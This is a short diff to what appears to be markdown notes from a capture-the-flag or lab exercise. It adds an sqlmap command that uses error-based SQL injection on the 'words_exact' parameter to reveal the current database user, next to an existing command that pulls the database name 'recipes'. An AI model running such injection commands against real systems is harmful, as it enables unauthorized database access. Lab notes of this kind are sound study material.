@@ -51,6 +51,9 @@
   - __`-p` ---> payload where you want to use it__
   - __`--technique=E`__
     - > __E= Error based, U= UNION base, B= BOOLEAN base__
+
+- __`sqlmap -r request -p words_exact --technique=E --current-user`__
+  - __To get the current username__
 - __`sqlmap -r request -p words_exact --technique=E --current-db`__
   - __To get the database name here it is `recipes`__
   
